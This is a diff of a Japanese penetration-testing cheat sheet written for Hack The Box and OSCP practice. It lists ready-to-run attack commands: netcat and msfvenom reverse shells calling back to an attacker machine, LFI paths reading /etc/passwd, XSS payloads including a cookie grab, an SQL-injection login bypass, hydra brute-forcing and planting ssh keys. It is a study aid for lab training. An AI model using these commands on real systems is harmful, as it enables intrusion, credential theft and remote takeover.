@@ -1,7 +1,9 @@
 # ペネトレーションテスト用チートシート
 Hack The Boxの攻略やOSCPの取得を目指して、まとめているチートシートです。  
 随時更新して成長していきます。
+
 <img src="http://www.hackthebox.eu/badge/image/185549" alt="Hack The Box">
+
 Twitter:@yukitsukai1731
 
 ## 目次
@@ -15,9 +17,11 @@ Twitter:@yukitsukai1731
   - [BurpSuite](#BurpSute)
 - [SMB Scan](#SMB_scan)
   - [smbclient](#smbclient)
-  - [impacket-smbserver](#impacket-smbserver)
+  - [impacket](#impacket)
+    - [impacket-smbserver](#impacket-smbserver)
+  - [smbmap](#smbmap)
   - [enum4linux](#enum4linux)
-- [侵入](#exploitation)
+- [侵入](#侵入)
   - [reverse_shell](#reverse_shell)
     - [Bash](#Bash)
     - [Powershell](#Powershell)
@@ -28,11 +32,10 @@ Twitter:@yukitsukai1731
       - [Windows(meterpreter)](#Windows(meterpreter))
       - [Windows(netcatなど)](#Windows(netcatなど))
       - [Linux](#Linux)
-  - [Web Application](#web-application)
-      - [Web Remote Code Execution](#web-remote-code-execution)
+  - [Webアプリケーション](#Webアプリケーション)
       - [LFI](#lfi)
       - [XSS](#xss)
-      - [SQLi](#sqli)
+      - [SQLインジェクション](#sqlインジェクション)
         - [sqlmap](#sqlmap)
 - [特権エスカレーション](#特権エスカレーション)
   - [metasploit local_exploit_suggester](#metasploit(local_exploit_suggester))
@@ -47,8 +50,14 @@ Twitter:@yukitsukai1731
 - [その他](#その他)
   - [ツールまとめ](#ツールまとめ)
     - [NetCat](#netcat)
+    - [JohnTheRipper](#johntheripper)
+    - [hydra](#hydra)
+    - [searchsploit](#searchsploit)
   - [未分類](#未分類)
     - [ssh](#ssh)
+      - [sshトンネリング](#sshトンネリング)
+      - [ssh-keygen](#ssh-keygen)
+    - [ftp](#ftp)
     - [mysql](#mysql) 
 
 
@@ -56,7 +65,7 @@ Twitter:@yukitsukai1731
 
 ## Nmap
 ポートスキャンツール。  
-対象の情報を得るためのまず第一歩。
+対象の情報を得るためのまず第一歩。  
 2つ目のスキャンは時間がかかるため、並行してスキャンする。
 
 ```
@@ -95,8 +104,8 @@ ls | grep smb
 # Web_scan
 
 ## Gobuster
-ディレクトリスキャナー。
-隠されたディレクトリがないか調べるために使用。
+ディレクトリスキャナー。  
+隠されたディレクトリや公開範囲が間違えて設定されているものはないかを調べるために使用。
 
 ```
 gobuster dir -u <target url> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,py -o <output filename>
@@ -110,7 +119,7 @@ gobuster dir -u <target url> -w /usr/share/wordlists/dirbuster/directory-list-2.
 
 
 ## Nikto
-Webサーバスキャナー。
+Webサーバスキャナー。  
 Webサイトを調査し悪用可能な脆弱性の検出を行う。
 
 ```
@@ -136,10 +145,10 @@ wpscan -url <target url> -e u -t -vp --log <output filename>
 - --log...ファイル出力
 
 ## BurpSuite
-ローカルプロキシツール。
-通信の改ざんをするために使用。
-他にもXSSやSQLインジェクションなどの脆弱性を発見するために使う。
-LFIなどを利用する時に使用。
+ローカルプロキシツール。  
+通信の改ざんをするために使用。  
+他にもXSSやSQLインジェクションなどの脆弱性を発見するために使う。  
+LFIなどを利用する時にも使用。  
 
 ![スクリーンショット 2020-06-08 14.01.26.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/9fa84891-db19-8f3c-eb87-c1e7777a3fce.png)
 
@@ -154,9 +163,19 @@ LFIなどを利用する時に使用。
 smbclient -L <target ip>
 ```
 
-# impacket-smbserver
-対象サーバにツールを送り込む際に使用。
-主にnetcatもpowershellも使えないようなときに使う。
+# impacket
+ネットワークプロトコルを操作するためにPythonクラスのコレクション。  
+SMB1-3やMSRPCなどのプロトコル実装自体を提供することに重点を置いている。  
+ツールを利用する以外にもよくexploitに使われているので、インストールしておく必要がある。
+
+```
+git clone https://github.com/SecureAuthCorp/impacket.git
+pip install .
+```
+
+## impacket-smbserver
+対象サーバにツールを送り込む際に使用。  
+主にnetcatもpowershellも使えないようなときに使う。  
 
 ```
 python3 /usr/share/doc/python3-impacket/examples/smbserver.py temp <共有するディレクトリ>
@@ -166,8 +185,14 @@ python3 /usr/share/doc/python3-impacket/examples/smbserver.py temp <共有する
 C:\WINDOWS\system32>\\<smbserverを立ち上げたIPアドレス>\temp\whoami.exe
 ```
 
+## smbmap
+ドメイン全体のsamba共有ドライブを列挙するために使用。
+```
+smbmap -u <username> -p <password> -H <target host ip>
+```
+
 ## enum4linux
-WindowsおよびSambaホストからのデータを列挙するためのツール
+WindowsおよびSambaホストからのデータを列挙するためのツール。
 
 ```
 enum4linux -U -o <target ip>
@@ -176,7 +201,7 @@ enum4linux -U -o <target ip>
 - -U...ユーザリスト取得
 - -o...OS情報取得
 
-# Exploitation
+# 侵入
 
 ## reverse_shell
 
@@ -227,6 +252,59 @@ msfvenom -p windows/shell_reverse_tcp lhost=10.0.0.1 lport=4444 –f exe > rever
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o <outout_name>.elf
 ```
 
+## Webアプリケーション
+### LFI
+LFIの脆弱性を見つけたら、BurpSuiteなどを用いて通信の改ざんを行い、/etc/passwdディレクトリなどを覗き、ユーザー一覧の確認を行う。
+```
+http://<target ip>/script.php?page=../../../../../../../../etc/passwd
+http://<target ip>/script.php?page=../../../../../../../../etc/hosts
+```
+
+### XSS
+攻撃者が作成した不正なスクリプトを脆弱性のあるWebアプリケーションを利用して閲覧者に実行させる攻撃。
+```
+'';!--"<XSS>=&{()}``\"
+```
+
+```
+<script>alert(1);</script>
+```
+
+```
+"><script>alert(1);</script>
+```
+
+aタグを使用
+```
+<a onmouseover="alert(document.cookie)">XSS</a>
+```
+iframeを使用
+```
+<iframe src="javascript:alert('XSS');"></iframe>
+```
+エンコードされたURIスキームを介してスクリプトを使用したXSS
+```
+<IMG SRC=j&#X41vascript:alert('XSS')>
+```
+
+### SQLインジェクション
+データベースシステムを不正に操作する攻撃。  
+不正ログインや個人情報の漏洩、Webサイトの改ざんが行われてしまう。  
+```
+' OR 'a'='a
+```
+#### SQLmap
+
+```
+sqlmap -u http://192.168.56.1/vuln.php?id=1
+```
+
+--user-agentオプション。
+Firefoxをユーザーエージェントとして使用することでフィルターをバイパスする。
+```
+sqlmap -u http：//192.168.0.1/vuln.php?id=1 --user-agent "Mozilla / 5.0（X11; Linux x86_64; rv：60.0 ）Gecko / 20100101 Firefox / 60.0 "
+```
+
 # 特権エスカレーション
 ### metasploit(local_exploit_suggester)
 exploitをせずに脆弱性をチェックするために使用するモジュール。
@@ -250,8 +328,8 @@ systeminfo > systeminfo.txt
 ```
 
 ## evlilwinrm
-WinRM(Windowsリモート管理)を利用したペンテスト特化ツール
-5985ポートが空いている時に使用
+WinRM(Windowsリモート管理)を利用したペンテスト特化ツール。  
+5985ポートが空いている時に使用。
 
 ### インストール
 
@@ -260,6 +338,7 @@ gem install evil-winrm
 ```
 
 ### 使い方
+
 ```
 evil-winrm -u <username> -p <password> -i <remote host ip>
 ```
@@ -296,7 +375,7 @@ direbusterやwifiパスワードなどのリスト集。
 # その他
 ## ツールまとめ
 ## netcat
-NetcatはTCP/UDPの各プロトコルと通信することができる万能ツールである。
+NetcatはTCP/UDPの各プロトコルと通信することができる万能ツール。
 
 通信待ち受け
 ```
@@ -318,23 +397,82 @@ netcatで通信を待ち受けつつ、対象から以下のコマンドを入�
 nc -nv <attack machine ip> <port number> -e cmd.exe
 ```
 
-netcatで待ち受けつつ、python・ruby・bash・phpなどを用いてreverse_shellに使うことができる。
-ほかの言語での使用方法は後述する。
+netcatで待ち受けつつ、python・ruby・bash・phpなどを用いてreverse_shellに使うことができる。  
 
+## johntheripper
+パスワードハッシュ解析ツール。  
+例えばzipなら以下のようにすることで解析可能
+```
+./zip2john test.zip > test.hash
+./john test.hash
+```
 
+## hydra
+sshやftpなどの認証をパスワードクラックするためのツール。  
+主にユーザ名が判明しているときや誤って公開されているパスワードリストなどが判明したときに使用。  
+```
+hydra -l <username or user.txt> -p <password or password.txt> 192.168.56.1 -t 4 ssh
+```
+
+```
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.0.1 http-post-form "/login:username=^USER^&password=^PASS^:F=failed"
+```
+
+## searchsploit
+Exploit-dbを即座に検索できるツール。
+```
+searchsploit <keyword>
+```
+
+ターミナル上でコードを閲覧。
+```
+searchsploit - searchsploit -m windows/remote/39161.py
+```
+
+ローカルにコードやテキストをダウンロード。  
+これでexploit用スクリプトをダウンロードする。
+```
+searchsploit -m searchsploit -m windows/remote/39161.py
+```
 
 
 # 未分類
 ## ssh
+リモートコンピュータと通信するためのプロトコル。
 ```
 ssh <username>@<target ip>
 ```
 
 ### SSHトンネリング
-ファイアウォールを超えて外部から目的サーバにアクセス可能
+ファイアウォールを超えて外部から目的サーバにアクセス可能。
 ```
 ssh -L 8080:127.0.0.1:80 <username>@<target ip>
 ```
+
+### ssh-keygen
+kaliで作成したものを対象のサーバに配置することでsshでアクセスする権限を奪取する。
+
+```
+ssh-keygen -t rsa -f id_rsa
+```
+
+
+## ftp
+ファイル転送プロトコル。
+```
+ftp <target ip>
+```
+ファイルのアップロード。  
+anonymousログインなどが可能で、ファイルをアップロードできるような状態であればreverse_shellに利用できる可能性がある。
+```
+ftp > put <filename>
+```
+
+ファイルのダウンロード.
+```
+ftp > get <filename>
+```
+
 
 ## mysql
 ログイン
@@ -357,9 +495,6 @@ mysql > create database sample_db;
 ```
 mysql > show tables;
 ```
-
-
-
 
 ユーザ情報取得
 ```
